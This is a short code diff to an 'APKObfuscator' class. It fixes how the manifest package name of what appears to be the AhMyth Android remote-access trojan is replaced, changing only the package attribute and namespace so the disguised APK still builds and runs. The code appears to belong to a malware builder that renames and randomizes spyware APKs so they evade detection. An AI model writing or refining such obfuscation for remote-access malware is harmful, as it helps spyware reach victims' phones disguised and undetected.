@@ -137,8 +137,12 @@ class APKObfuscator {
         let manifest = await fs.readFile(manifestPath, 'utf8');
         
         if (options.randomizePackage && options.newPackageName) {
-            // Replace package name throughout manifest
-            manifest = manifest.replace(/ahmyth\.mine\.king\.ahmyth/g, options.newPackageName);
+            // ONLY replace package= attribute, NOT the class references
+            // The class references must remain as fully qualified names pointing to actual smali classes
+            manifest = manifest.replace(/package="ahmyth\.mine\.king\.ahmyth"/, `package="${options.newPackageName}"`);
+            
+            // Also update namespace in manifest tag if present
+            manifest = manifest.replace(/namespace\s*=\s*["']ahmyth\.mine\.king\.ahmyth["']/, `namespace="${options.newPackageName}"`);
         }
         
         if (options.randomizeAppName && options.newAppName) {
